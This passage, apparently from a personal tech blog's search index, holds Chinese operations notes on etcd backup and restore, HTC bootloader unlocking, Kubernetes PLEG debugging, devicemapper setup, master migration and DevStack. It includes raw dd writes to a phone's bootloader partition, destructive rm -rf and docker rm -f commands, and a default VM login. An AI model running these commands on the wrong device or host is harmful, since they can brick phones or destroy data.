容器生存周期事件处理：https://kubernetes.io/docs/tasks/configure-pod-container/attach-handler-lifecycle-event/https://kubernetes.io/docs/concepts/containers/container-lifecycle-hooks/","link":"/hexo-blog/2018/04/04/Kubernetes-%E5%AE%B9%E5%99%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86/"},{"title":"etcd 集群的备份和还原","text":"准备工作安装 etcdctl 方法1 1apt install etcd-client=3.2.17+dfsg-1 方法2 123456789export RELEASE=&quot;3.2.17&quot;test -d /tmp/etcd &amp;&amp; mkdir -p /tmp/etcd &amp;&amp; cd /tmp/etcdwget https://github.com/etcd-io/etcd/releases/download/v${RELEASE}/etcd-v${RELEASE}-linux-amd64.tar.gztar -zxvf etcd-v${RELEASE}-linux-amd64.tar.gzcd etcd-v${RELEASE}-linux-amd64cp etcdctl /usr/local/binetcdctl --version 方法3 使用 docker cp 从 etcd 容器中拷贝。 备份etcd 的备份有两种方式，选择其一即可。 方式一：使用 etcdctl snapshot 命令（推荐）在任何一个 member 节点执行： 1ETCDCTL_API=3 etcdctl snapshot save snapshot.db 方式二：拷贝 member/snap/db 文件1cp /var/lib/etcd/member/snap/db snapshot.db 如果使用此方法，etcdctl snapshot restore 时需要设置 --skip-hash-check=true 还原方式一：单节点还原成功后，再将其他节点加入集群根据 snapshot.db 生成新的 data dir： 1234567891011# restore.shrm /var/lib/etcd -rf ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \\ --name k8s-etcd-host1 \\ --data-dir /var/lib/etcd \\ --initial-cluster k8s-etcd-host1=http://host1:2380 \\ --initial-cluster-token k8s-etcd \\ --initial-advertise-peer-urls http://host1:2380 \\ --skip-hash-check=false 启动单实例： 12345678910111213spec: containers: - command: - etcd - --name=k8s-etcd-host1 - --initial-advertise-peer-urls=http://host1:2380 - --listen-peer-urls=http://host1:2380 - --listen-client-urls=http://0.0.0.0:2379 - --advertise-client-urls=http://host1:2379 - --data-dir=/var/lib/etcd - --initial-cluster-token=k8s-etcd - --initial-cluster=k8s-etcd-host1=http://host1:2380 - --initial-cluster-state=existing 将其他节点依次加入集群（先执行 add 命令再启动实例），add 命令如下： 1etcdctl member add k8s-etcd-host2 http://host2:2380 启动实例： 12345678910111213spec: containers: - command: - etcd - --name=k8s-etcd-host2 - --initial-advertise-peer-urls=http://host2:2380 - --listen-peer-urls=http://host2:2380 - --listen-client-urls=http://0.0.0.0:2379 - --advertise-client-urls=http://host2:2379 - --data-dir=/var/lib/etcd - --initial-cluster-token=k8s-etcd - --initial-cluster=k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380 - --initial-cluster-state=existing 其他实例操作方法类似。 方式二：同时还原多节点集群将 snapshot.db 文件拷贝至所有 etcd 节点，根据 snapshot.db 生成 data dir： 12345678910111213141516171819202122232425ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \\ --name k8s-etcd-host1 \\ --data-dir /var/lib/etcd \\ --initial-cluster k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380,k8s-etcd-host3=http://host3:2380 \\ --initial-cluster-token k8s-etcd \\ --initial-advertise-peer-urls http://host1:2380 \\ --skip-hash-check=false ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \\ --name k8s-etcd-host2 \\ --data-dir /var/lib/etcd \\ --initial-cluster k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380,k8s-etcd-host3=http://host3:2380 \\ --initial-cluster-token k8s-etcd \\ --initial-advertise-peer-urls http://host2:2380 \\ --skip-hash-check=false ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \\ --name k8s-etcd-host3 \\ --data-dir /var/lib/etcd \\ --initial-cluster k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380,k8s-etcd-host3=http://host3:2380 \\ --initial-cluster-token k8s-etcd \\ --initial-advertise-peer-urls http://host3:2380 \\ --skip-hash-check=false 还原后启动所有 etcd 实例 。启动参数如下，其他类似： 12345678910111213spec: containers: - command: - etcd - --name=k8s-etcd-host1 - --initial-advertise-peer-urls=http://host1:2380 - --listen-peer-urls=http://host1:2380 - --listen-client-urls=http://0.0.0.0:2379 - --advertise-client-urls=http://host1:2379 - --data-dir=/var/lib/etcd - --initial-cluster-token=k8s-etcd - --initial-cluster=k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380,k8s-etcd-host3=http://host3:2380 - --initial-cluster-state=existing 注意 启动 etcd 之前最好停掉 kube-apiserver 参考 https://coreos.com/etcd/docs/3.1.12/op-guide/recovery.html https://coreos.com/etcd/docs/latest/op-guide/runtime-configuration.html","link":"/hexo-blog/2018/07/25/etcd-%E9%9B%86%E7%BE%A4%E7%9A%84%E5%A4%87%E4%BB%BD%E5%92%8C%E8%BF%98%E5%8E%9F/"},{"title":"HTC 刷机备忘","text":"笔者对 HTC 手机有着深厚的感情，从 HTC G2 到 HTC M8，经历了 HTC 的鼎盛和衰落。本文记录了一些常用的刷机方法和 hack 命令，以作备忘。 官方 Unlock/ReLock 方法Unlock获取解锁 token1fastboot oem get_identifier_token 123456789101112131415161718&lt;&lt;&lt;&lt; Identifier Token Start &gt;&gt;&gt;&gt;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&lt;&lt;&lt;&lt;&lt; Identifier Token End &gt;&gt;&gt;&gt;&gt; 获取解锁码前往 http://www.htcdev.com/bootloader 获取官方解锁码。 刷入解锁码1fastboot flash unlocktoken Unlock_code.bin Relock1fastboot oem lock 刷入 Recovery 方法常规方法12adb reboot bootloaderfastboot flash recovery recovery.img 重启后进入 recovery 界面 12fastboot rebootadb reboot recovery 或者可以在 fastboot 界面直接进入 recovery 在 S-OFF + LOCKED 状态下刷入第三方 Recovery 的方法准备 ZIP 文件在 S-OFF + LOCKED 情况下通过 adb 工具线刷时，所用的 recovery.zip 包里必须包括 android-info.txt 和 recovery.img。而这个 android-info.txt 的内容必须符合你的手机信息，以我的 Sprint 版为例，其内容是： 1234567modelid: PN0720000cidnum: 11111111mainver: 5.03.651.3btype:1aareport:1DelCache:1hbootpreupdate:3 查询以上信息的方法为：在 adb 中输入 fastboot getvar all 即可看到，然后将所需的 modelid、cidnum、mainver 信息修改到 android-info.txt 文件中。 android-info.txt 文件可以从官方 RUU 中提取，然后把上面查询到的信息替换到里面即可。 最后将 recovery.img 和 android-info.txt 一起打包到 zip 压缩包中，并放入 adb 工具的文件夹里即可开始下面步骤了。 （刷 radio 也是同理，必须在 zip 压缩包中加入 android-info.txt。） 123adb reboot bootloaderfastboot oem rebootRUUfastboot flash zip recovery.zip 1fastboot reboot BootLoader 状态随意修改（需要 S-OFF）查看状态1dd if=/dev/block/mmcblk0p3 bs=1 skip=33796 count=4 LOCKto LOCK your bootloader,enter the following: 12345678910111213adb devicesadb shellsu (if needed to get a # prompt)# (i would very strongly recomend you copy/paste this)echo -ne '\\x00\\x00\\x00\\x00' | dd of=/dev/block/mmcblk0p3 bs=1 seek=33796# (exit a second time if you need to to get back to a normal &gt; prompt)exitadb reboot bootloader verify you are now locked UNLOCKto UNLOCK your bootloader,enter the following: 12345678910111213adb devicesadb shellsu (if needed to get a # prompt)# (i would very strongly recomend you copy/paste this)echo -ne &quot;HTCU&quot; | dd of=/dev/block/mmcblk0p3 bs=1 seek=33796# (exit a second time if you need to to get back to a normal &gt; prompt)exitadb reboot bootloader verify you are now unlocked RELOCKto RELOCK your bootloader,enter the following: 12345678910111213adb devicesadb shellsu (if needed to get a # prompt)# (i would very strongly recomend you copy/paste this)echo -ne &quot;HTCL&quot; | dd of=/dev/block/mmcblk0p3 bs=1 seek=33796# (exit a second time if you need to to get back to a normal &gt; prompt)exitadb reboot bootloader verify you are now relocked 参考http://bbs.gfan.com/android-7235658-1-1.html https://androidforums.com/threads/how-to-lock-unlock-your-bootloader-without-htcdev-s-off-required.916138/ HTC 测试指令测试指令： 1*#*#3424#*#* 工程模式 1*#*#4636#*#*","link":"/hexo-blog/2018/10/20/HTC-%E5%88%B7%E6%9C%BA%E5%A4%87%E5%BF%98/"},{"title":"PLEG unhealthy 导致节点状态不断在 Ready&#x2F;NotReady 之间切换问题","text":"现象 收到告警提示 PLEG 延时升高（240s） 节点状态在 Ready 和 NotReady 之间频繁切换 有 pod 处于 Terminating 状态 排查和原因分析查看 kubelet PLEG 相关日志，发现大量 PLEG 超时日志： 1234567Nov 27 10:10:07 xq68 kubelet[24562]: E1127 10:10:07.444787 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceededNov 27 10:14:08 xq68 kubelet[24562]: E1127 10:14:08.502149 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceededNov 27 10:18:09 xq68 kubelet[24562]: E1127 10:18:09.555935 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceededNov 27 10:22:10 xq68 kubelet[24562]: E1127 10:22:10.838479 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceededNov 27 10:26:11 xq68 kubelet[24562]: E1127 10:26:11.878116 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceededNov 27 10:30:12 xq68 kubelet[24562]: E1127 10:30:12.928984 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceededNov 27 10:34:13 xq68 kubelet[24562]: E1127 10:34:13.993793 24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceeded PLEG (Pod Lifecycle Event Generator) 是 kubelet 定期检查节点上每个 pod 状态的逻辑，它内部缓存了节点所有 pod 的状态，每次通过 relist 时从 container runtime (dockerd) 获取 pod (也就是 pod 包含的所有 container) 的最新状态，然后和当前缓存比较，产生 PodLifecycleEvent。然后遍历所有的 events，更新 pod 状态缓存后将该 event 发送至 event channel。部分代码如下： 而问题就出在更新 Pod 缓存的逻辑，首先 PLEG 更新缓存是串行的，也就是前一个 Pod 执行成功了，后一个 Pod 才能开始；其次，更新缓存会调用 container runtime 的 GetPodStatus 接口来获取 Pod 状态（通过 rpc 获取容器状态和 Pod IP）；而 rpc 调用是阻塞的，默认 120s (2min) 超时；PLEG 只要发现两次 relist 间隔超过 3min，就会认为 PLEG unhealthy，将节点设为 NotReady。 上面的 GetPodStatus 中有调用 cri 的 rpc 接口 PodSandboxStatus 和 ListContainers/ContainerStatus 分别获取 pause 容器和其他容器的状态。 其中 ListContainers/ContainerStatus 里只会从 docker daemon 获取容器信息，而 PodSandboxStatus 不仅会从 docker daemon 获取 pause 容器信息，还会从 CNI 通过 GetPodNetworkStatus 接口获取 pod ip。这几个请求都是 grpc 请求，且超时时间都是 2min，如果中间因为各种原因 hang 住，会阻塞 2min 才能超时返回。 简单整理了整个调用逻辑如下： 1234 grpc http grpckubelet &lt;----&gt; cri &lt;----&gt; dockerd &lt;----&gt; containerd &lt;----&gt; cni &lt;----&gt; network plugin grpc command 同时由上面代码分析，PLEG 超时的原因，就是在更新某个 Pod 状态时，kubelet 通过 rpc 调用 docker daemon 或者 network plugin 时超时了。 调用 docker daemon 超时的原因有： docker daemon hang 住。 调用 network plugin 超时的原因有： network plugin 是利用 command exec 方式调用的， 因为各种原因进程不退出，会导致调用 hang 住。 调用 network plugin 还有个细节，就是每次调用前会按照 pod 加锁，所以只要一次调用 hang 住，后面的调用都会 hang 住，等待锁释放。 但是为什么对一个 Pod 调用 GetPodStatus 时 grpc 超时会导致 PLEG unhealthy 呢？我们先看看两个逻辑： 一是 relist 时的 updateCache 逻辑： PLEG 每次 relist 时不仅要对当前状态有更新的 Pod 进行一次状态获取，还要对上次获取失败的 Pod 重新执行一次状态获取。也就是说，如果一个 grpc 请求的超时是 2min，那么假设一个 Pod 有问题，会将单次 relist 耗时放大至 4min。 二是 PLEG healthy check 逻辑： Runtime Health Checker 会定时调用 PLEG 的 Healty 函数对 PLEG 执行状态进行检测，从而判断节点的健康状况。每次检测时，只要判断距离上次执行完 relist 的时间大于 3 分钟，上层逻辑就会认为节点不健康了，便会根据结果将节点设置为 NotReady。 现在的场景是 PLEG relist 会执行，但是每次执行对于有问题的 Pod 要执行两次 updateCache/GetPodStatus，也就是等两次超时需要 4min 时间。Runtime Healthy Checker 每隔 100ms ~ 5s 执行一次，因此在 4min 内，前 3min 的 health check 是成功的，成功之后会将节点标记为 Ready，而 3min 后的 1min 内 healthy check 会失败，kubelet 又会将节点标记为 NotReady。 这个也能从监控图像上得到证实，如下图，ready status == 1 的间隔是 3min，ready status == 0 的间隔是 1min。 接下来我们一步步确认是哪个组件出了问题导致的： 确认 docker daemon 状态，看状态获取接口是否正常： 1curl --unix-socket /var/run/docker.sock http:/containers/40cddec6426e280b8e42a07ca5c8711d18557f3163c2541efd39462ccba10e39/json 结果正常返回。 再查看网络组件进程状态，发现 nuke 和 nuke-ipam 两个进程从 2018-11-23 启动后一直没有退出（今天是 2018-11-27）。正常情况下，nuke 和 nkue-ipam 只在 kubelet 通过 cni 调用时执行，执行成功后会立即退出，而现在没有退出是个异常。因此判断问题可能出在 nuke 组件上。 1234567root@xq68:~# ps aux | grep nukeroot 21122 3.3 0.0 40064 38164 ? Ssl Nov19 390:35 /nuke/nukedaemonroot 22814 0.0 0.0 116436 8528 ? Sl Nov23 0:00 /opt/cni/bin/nukeroot 22831 0.0 0.0 115204 8192 ? Sl Nov23 0:00 /opt/cni/bin/nuke-ipamroot 24012 0.0 0.0 14224 1032 pts/32 S+ 10:24 0:00 grep --color=auto nukeroot 29315 0.0 0.0 1560 960 ? Ss Jul27 0:00 sh /app/install-nuke-cni.shroot 31448 0.0 0.0 28280 23696 ? Ssl Nov01 28:36 /bin/nuke-l3-agent 之前出现同样的问题时，为方便排查，我保存了 nuke 相关的 stack 信息，具体原因还需要网络组协助排查。 另外，如果网络方案为 calico，calico 进程 Z 住也会导致该问题： 解决解决方式有：（选一种即可） 删除问题容器（一般都是 pause 容器） 12docker ps -a | grep apiserver-inspection-workers-ds-1542964416453270535-6vhmtdocker rm -f &lt;container_id&gt; 删除后 kubelet 已经找不到这个容器，会认为 sandbox 已经 stop 成功，就不会再继续执行 PodSandBoxStatus 调用 cri 和 cni，从而就不会触发有问题的逻辑了。 重启 kubelet（待验证） 对于 neutron 网络方案，手动 kill 掉 hang 住的 nuke 和 nuke-ipam，network plugin 强行返回错误，kubelet 会继续执行后续逻辑。 改进优化 kubelet PLEG 逻辑 考虑并行执行，一个 Pod 有问题时不影响整个 PLEG relist 耗时； 缩小 rpc 超时时间（目前 2min），对于正常场景来说，调用 cri 和 cni 都用不了这么长的时间。缩小超时可以减小单个 Pod 超时对 PLEG 整体的影响； 优化 updateCache 逻辑，保证每次 relist 对同一个 Pod 只进行一次状态获取。 修复 network plugin寻找 network plugin hang 住的原因并修复。 优化监控告警 pleg latency &gt; 240s for 15min -&gt; error 短信、slack 告知 pleg latency &gt; 240s -&gt; warning slack 告知 相关问题https://github.com/kubernetes/kubernetes/issues/45419","link":"/hexo-blog/2018/11/27/PLEG-unhealthy-%E5%AF%BC%E8%87%B4%E8%8A%82%E7%82%B9%E7%8A%B6%E6%80%81%E4%B8%8D%E6%96%AD%E5%9C%A8-Ready-NotReady-%E4%B9%8B%E9%97%B4%E5%88%87%E6%8D%A2%E9%97%AE%E9%A2%98/"},{"title":"K8s Node Docker devicemapper 设备初始化方法","text":"步骤 drain 掉节点上所有的 pod 1kubectl drain &lt;node-name&gt; --ignore-daemonsets --delete-local-data --force 停止 kubelet 1systemctl stop kubelet 停止所有容器 12docker stop $(docker ps -a -q)docker rm $(docker ps -a -q) 停止 docker daemon 1systemctl stop docker 创建 lvm 12345pvcreate -y /dev/sdX1vgcreate docker /dev/sdX1lvcreate --wipesignatures y -n thinpool docker -l 95%VGlvcreate --wipesignatures y -n thinpoolmeta docker -l 1%VGlvconvert -y --zero n -c 512k --thinpool docker/thinpool --poolmetadata docker/thinpoolmeta vim /etc/lvm/profile/docker-thinpool.profile 配置见附录 12lvchange --metadataprofile docker-thinpool docker/thinpoollvs -o+seg_monitor vim /etc/docker/daemon.json 配置见附录 删除旧的 docker 相关文件 1rm -rf /var/lib/docker/* 启动 docker 1systemctl start docker 查看是否成功转换 1docker info 启动 kubelet 1systemctl start kubelet uncordon 节点 1kubectl uncordon &lt;node-name&gt; 附录/etc/lvm/profile/docker-thinpool.profile 1234activation { thin_pool_autoextend_threshold=80 thin_pool_autoextend_percent=20} /etc/docker/daemon.json 1234567891011121314151617{ &quot;log-level&quot;: &quot;debug&quot;, &quot;live-restore&quot;: true, &quot;icc&quot;: false, &quot;storage-driver&quot;: &quot;devicemapper&quot;, &quot;storage-opts&quot;: [ &quot;dm.thinpooldev=/dev/mapper/docker-thinpool&quot;, &quot;dm.use_deferred_removal=true&quot;, &quot;dm.use_deferred_deletion=true&quot;, &quot;dm.basesize=20G&quot; ], &quot;log-driver&quot;: &quot;json-file&quot;, &quot;log-opts&quot;: { &quot;max-size&quot;: &quot;512m&quot;, &quot;max-file&quot;: &quot;3&quot; }} 参考Use the Device Mapper storage driver","link":"/hexo-blog/2018/12/31/K8s%20Node%20Docker%20devicemapper%20%E8%AE%BE%E5%A4%87%E5%88%9D%E5%A7%8B%E5%8C%96%E6%96%B9%E6%B3%95/"},{"title":"K8s 集群 master 节点迁移","text":"背景当前测试环境 K8s 集群 3 台 master 机器配置相对较高，之前为了充分利用资源将 workload 与 control plane + etcd 混部，这样大大降低了集群的稳定性，而 IaaS 层没有用虚拟化技术，不支持原地升级规格，因此我们决定通过迁移的方式来实现： 让 K8s master 组件独享 3 台机器，与 workload 分开部署 用 3 台性能较差的机器代替，避免资源浪费 旧的 master 节点为：oldmaster-1 oldmaster-2 oldmaster-3新的 master 节点为：master-1 master-2 master-3 前置条件检查客户端配置 检查所有 kubelet server 配置为 LB 地址 如果不是则改为 LB 地址 1ansible all -m shell -a 'sed -i &quot;s#server: https://.*#server: https://10.200.20.241:443#&quot; /etc/kubernetes/kubelet.conf' 检查 kube-proxy server 配置为 LB 地址 1kubectl -n kube-system get configmap kube-proxy -o yaml | sed 's#server: https://.*#server: https://10.200.20.241:443#' | kubectl apply -f - 检查所有 controller-manager 和 scheduler server 配置为本机 apiserver 6443 地址 确保所有业务方 kubeconfig 都使用 LB 地址 检查 /etc/fstab 正确性检查新的 master 机器 /etc/fstab 是否正确，防止重启启动失败。 操作步骤排空 master-1-3，增加 labels 和 taints drain 掉 master-1 master-2 master-3，3台机器 123kubectl drain master-1 --ignore-daemonsets --forcekubectl drain master-2 --ignore-daemonsets --forcekubectl drain master-3 --ignore-daemonsets --force 设置 labels 和 taints，uncordon 3台新机器，防止其他 Pod 调度上来 123kubectl label node master-1 master-2 master-3 node-role.kubernetes.io/master=truekubectl taint node master-1 master-2 master-3 node-role.kubernetes.io/master=true:NoSchedulekubectl taint node master-1 master-2 master-3 test-only=true:NoSchedule 部署 master 组件etcd 加入集群初始化存储目录 1234rm /disk4/* -rfumount /disk4mkdir /var/lib/etcdmount /dev/sdo1 /var/lib/etcd 将 3 个新的 etcd 依次加入集群，保持 6 节点 etcd 123etcdctl member add master-1 http://10.200.20.101:2380etcdctl member add master-2 http://10.200.20.102:2380etcdctl member add master-3 http://10.200.20.103:2380 依次启动 3 个新的 etcd 注意执行一次 member add 后启动一个 etcd 准备证书 拷贝证书 /etc/kubernetes/pki 重新签发 apiserver 证书，包含 3 个新 apiserver 的 IP 和 LB 地址 参考：Kubernetes-APIServer-证书的手动签发 替换 master-1-3 apiserver.crt 配置并启动 apiserver 将 apiserver etcd url 配置为 3 个 新的 etcd 集群地址 1--etcd-servers=http://10.200.20.101:2379,http://10.200.20.102:2379,http://10.200.20.103:2379 apiserver-count 设置为 2 启动 apiserver 配置并启动 apiserver-nginx-lb 将 apiserver-nginx-lb upstream 配置为 新的 3 台 apiserver地址 12345upstream kube_apiserver { server 10.200.20.101:8686 max_fails=0; server 10.200.20.102:8686 max_fails=0; server 10.200.20.103:8686 max_fails=0;} 启动 apiserver-nginx-lb kubectl 测试 3 台新节点的 443 端口是否可以正常访问集群。 配置并启动 kube-controller-manager 和 kube-scheduler 拷贝并修改 controller-manager.conf 和 scheduler.conf 拷贝 controller-manager 和 scheduler 配置和 manifests 文件，启动组件 更新 calico 配置修改 cm calico-config更新 etcd 地址 重启 calico-node 和 calico-policy-controller 切换流量 master-1 master-2 master-3 安装配置 keepalived，配置 VIP 停掉 oldmaster-1-3 的 keepalived，让 VIP 漂移至 master-1-3 移除老的组件 将 apiserver-nginx-lb、apiserver 移除 将 etcd 依次踢出集群 1etcdctl member remove &lt;member_id&gt; 修改新的 etcd 配置， --initial-cluster 参数去掉老的 etcd url 删除 labels 和 taints12kubectl label node oldmaster-1 oldmaster-2 oldmaster-3 node-role.kubernetes.io/master-kubectl taint node master-1 master-2 master-3 test-only- 更新监控更新 kube-apiserver-exporter endpoints","link":"/hexo-blog/2018/12/31/K8s%20%E9%9B%86%E7%BE%A4%20master%20%E8%8A%82%E7%82%B9%E8%BF%81%E7%A7%BB/"},{"title":"使用 Devstack 搭建 Openstack 集群","text":"环境搭建多节点搭建步骤： https://docs.openstack.org/devstack/rocky/guides/multinode-lab.html 要配置 kvm，否则使用默认的 qemu 跑 vm 性能会很差： https://docs.openstack.org/devstack/rocky/guides/devstack-with-nested-kvm.html control 节点配置: 1234567891011121314[[local|localrc]]HOST_IP=10.20.102.37FLAT_INTERFACE=bond0FIXED_RANGE=10.4.128.0/20FIXED_NETWORK_SIZE=4096FLOATING_RANGE=10.20.102.223/27MULTI_HOST=1LOGFILE=/opt/stack/logs/stack.sh.logADMIN_PASSWORD=DATABASE_PASSWORD=RABBIT_PASSWORD=SERVICE_PASSWORD=LIBVIRT_TYPE=kvmIP_VERSION=4 compute 节点配置: 123456789101112131415161718192021222324[[local|localrc]]HOST_IP=10.20.102.38 # change this per compute nodeFLAT_INTERFACE=bond0FIXED_RANGE=10.4.128.0/20FIXED_NETWORK_SIZE=4096FLOATING_RANGE=10.20.102.223/27MULTI_HOST=1LOGFILE=/opt/stack/logs/stack.sh.logADMIN_PASSWORD=DATABASE_PASSWORD=RABBIT_PASSWORD=SERVICE_PASSWORD=DATABASE_TYPE=mysqlSERVICE_HOST=10.20.102.37MYSQL_HOST=$SERVICE_HOSTRABBIT_HOST=$SERVICE_HOSTGLANCE_HOSTPORT=$SERVICE_HOST:9292ENABLED_SERVICES=n-cpu,q-agt,n-api-meta,c-vol,placement-clientNOVA_VNC_ENABLED=TrueNOVNCPROXY_URL=&quot;http://$SERVICE_HOST:6080/vnc_auto.html&quot;VNCSERVER_LISTEN=$HOST_IPVNCSERVER_PROXYCLIENT_ADDRESS=$VNCSERVER_LISTENLIBVIRT_TYPE=kvmIP_VERSION=4 FIXED_RANGE 是 vm 实例的内网地址，供 vm 之间访问，vm 创建时便会分配一个，创建后一般不能更改。 FLOATING_RANGE 是 vm 实例的外网地址，供物理机访问 vm，以及 vm 访问物理机，可以在实例创建后进行绑定和解绑。这个网段一般设置为物理机 IP 的子网段。 如果需要 ipv6，则需要修改以下参数： 12345net.ipv6.conf.all.disable_ipv6=0net.ipv6.conf.default.disable_ipv6=0net.ipv6.conf.lo.disable_ipv6=0sysctl -p 不要按照 devstack 官方文档创建 local.sh。因为 openstack rocky 已经默认使用 neutron 了，这个脚本对 neutron 没有什么作用。https://bugs.launchpad.net/devstack/+bug/1783576 1for i in `seq 2 10`; do /opt/stack/nova/bin/nova-manage fixed reserve 10.4.128.$i; done 多节点如果出现调度错误，需要执行： 1./tools/discover_hosts.sh 或者： 1nova-manage cell_v2 discover_hosts --verbose 如果如果遇到一些未知的问题，尝试拆除环境，清除所有资源后重试： 123./unstack.sh./clean.sh./stack.sh 镜像创建1openstack image create --public --disk-format qcow2 --container-format bare --file xenial-server-cloudimg-amd64-disk1.img ubuntu-xenial-server-amd64 实例创建首先进行 admin 认证鉴权： 123sudo su - stackcd /opt/stack/devstacksource openrc 创建安全组规则，允许 ping 和 ssh： 12openstack security group rule create --proto icmp defaultopenstack security group rule create --proto tcp --dst-port 22 default 创建测试实例： 1234openstack server create --flavor m1.tiny \\--image $(openstack image list | grep cirros | cut -f3 -d '|') \\--nic net-id=$(openstack network list | grep private | cut -f2 -d '|' | tr -d ' ') \\--security-group default vm 创建 floating IP： 1openstack floating ip create public 将 floating IP 与实例绑定： 1openstack server add floating ip vm 10.20.102.238 就可以通过 floating IP 登录 vm 实例了，用户名密码是： 12cirroscubswin:) vm 如果需要上外网，需要配置 nat。在物理机上执行： 1234#ifconfig br-ex 10.20.102.223/27iptables -t nat -I POSTROUTING -s 10.20.102.223/27 -j MASQUERADEiptables -I FORWARD -s 10.20.102.223/27 -j ACCEPTiptables -I FORWARD -d 10.20.102.223/27 -j ACCEPT 配置卷类型创建 pv 和 vg： 12pvcreate /dev/sdb1vgcreate stack-volumes-hdd /dev/sdb1 配置 cinder： 1vim /etc/cinder/cinder.conf 123456789101112[DEFAULT]default_volume_type = hddenabled_backends = hdd,ssd[hdd]image_volume_cache_enabled = Truevolume_clear = zerolvm_type = autotarget_helper = tgtadmvolume_group = stack-volumes-hddvolume_driver = cinder.volume.drivers.lvm.LVMVolumeDrivervolume_backend_name = hdd 重启 openstack： 1systemctl restart devstack@* 创建卷类型： 12openstack volume type create hddopenstack volume type set hdd --property volume_backend_name=hdd 常见问题volume 无法创建 排查 1sudo journalctl -f --unit devstack@c-vol 1Mar 06 14:59:18 kirk-system cinder-volume[27813]: ERROR oslo_service.service [None req-e1391562-6252-4b98-ba3a-6420edbafffe None None] Error starting thread.: DetachedInstanceError: Parent instance &lt;VolumeAttachment at 0x7f6455ffee90&gt; is not bound to a Session; lazy load operation of attribute 'volume' cannot proceed (Background on this error at: http://sqlalche.me/e/bhk3) 解决 https://ask.openstack.org/en/question/103315/cinder-volume-attached-to-a-terminated-server-now-i-cant-delete-it/ ubuntu 18.04 切换到 /etc/network/interfacehttps://askubuntu.com/questions/1031709/ubuntu-18-04-switch-back-to-etc-network-interfaces 参考文档 golang SDK：http://gophercloud.io/docs/compute/#servers terraform：https://www.terraform.io/docs/providers/openstack/ 获取 Openstack 镜像：https://docs.openstack.org/image-guide/obtain-images.html 使用 systemd 管理 devstack：https://docs.openstack.org/devstack/rocky/systemd.html devstack networking： https://docs.openstack.org/devstack/rocky/networking.html https://wiki.openstack.org/wiki/OpsGuide-Network-Troubleshooting neutron 相关： https://docs.openstack.org/devstack/rocky/guides/neutron.html https://www.ibm.com/developerworks/cn/cloud/library/1402_chenhy_openstacknetwork/ 附neutron+vlan 模式配置： 123456789101112131415161718192021222324252627[[local|localrc]]HOST_IP=10.20.102.37PUBLIC_INTERFACE=bond1LOGFILE=/opt/stack/logs/stack.sh.logADMIN_PASSWORD=DATABASE_PASSWORD=RABBIT_PASSWORD=SERVICE_PASSWORD=LIBVIRT_TYPE=kvm## Neutron optionsIP_VERSION=4Q_USE_SECGROUP=TrueENABLE_TENANT_VLANS=TrueTENANT_VLAN_RANGE=3001:4000PHYSICAL_NETWORK=defaultOVS_PHYSICAL_BRIDGE=br-exQ_USE_PROVIDER_NETWORKING=Truedisable_service q-l3## Neutron Networking options used to create Neutron SubnetsIPV4_ADDRS_SAFE_TO_USE=&quot;203.0.113.0/24&quot;NETWORK_GATEWAY=203.0.113.1PROVIDER_SUBNET_NAME=&quot;provider_net&quot;PROVIDER_NETWORK_TYPE=&quot;vlan&quot;SEGMENTATION_ID=2010USE_SUBNETPOOL=False 12345678910111213141516171819202122232425262728[[local|localrc]]HOST_IP=10.20.102.38 # change this per compute 